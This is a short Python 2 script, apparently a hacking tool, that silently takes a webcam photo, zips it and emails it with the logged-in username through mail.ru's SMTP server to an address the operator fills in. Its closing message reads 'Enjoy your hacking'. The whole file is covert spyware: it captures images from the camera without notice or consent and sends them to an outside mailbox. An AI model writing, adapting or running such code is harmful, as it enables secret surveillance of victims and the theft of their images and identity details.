import cv2 , tempfile , time , sys,getpass
import zipfile
import smtplib
from email.MIMEMultipart import MIMEMultipart
from email.MIMEBase import MIMEBase
from email.MIMEText import MIMEText
from email.Utils import COMMASPACE, formatdate
from email import Encoders
import os,datetime
user_name=getpass.getuser()
path = tempfile.mkdtemp()

p2=path+"\img1.jpg"
camera = cv2.VideoCapture(0)
time.sleep(1)
return_value,image = camera.read()

cv2.imwrite(p2,image)

camera.release()
cv2.destroyAllWindows()

time.sleep(4)
file_path = tempfile.mkdtemp()
zip_zip=zipfile.ZipFile(file_path+"\photo.zip", 'w')
zip_zip.write(p2)
zip_zip.close()
zipfile_path=file_path+"\photo.zip"

smtpUser = 'example@mail.ru'
smtpPass ='email pass'

toAdd = ''
fromAdd = smtpUser

today = datetime.date.today()

subject  = 'Data File 01 %s' % today.strftime('%Y %b %d')
header = 'To :' + toAdd + '\n' + 'From : ' + fromAdd + '\n' + 'Subject : ' + subject + '\n'
body = 'This is a data file on %s' % today.strftime('%Y %b %d')

attach = 'Data on %s.jpg' % today.strftime('%Y-%m-%d')

def sendMail(to, subject, text, files=[]):
    assert type(to)==list
    assert type(files)==list

    msg = MIMEMultipart()
    msg['From'] = smtpUser
    msg['To'] = COMMASPACE.join(to)
    msg['Date'] = formatdate(localtime=True)
    msg['Subject'] = subject

    msg.attach( MIMEText(text) )

    for file in files:
        part = MIMEBase('application', "octet-stream")
        part.set_payload( open(file,"rb").read() )
        Encoders.encode_base64(part)
        part.add_header('Content-Disposition', 'attachment; filename="%s"'
                       % os.path.basename(file))
        msg.attach(part)

    server = smtplib.SMTP('smtp.mail.ru:587')
    server.ehlo_or_helo_if_needed()
    server.starttls()
    server.ehlo_or_helo_if_needed()
    server.login(smtpUser,smtpPass)
    server.sendmail(smtpUser, to, msg.as_string())

    print 'Done ^__^ '

    server.quit()


sendMail( ['email that you want to send photo to it'], "this photo from "+user_name, "taking photo Done ^__^ , Enjoy your hacking ", [zipfile_path] )



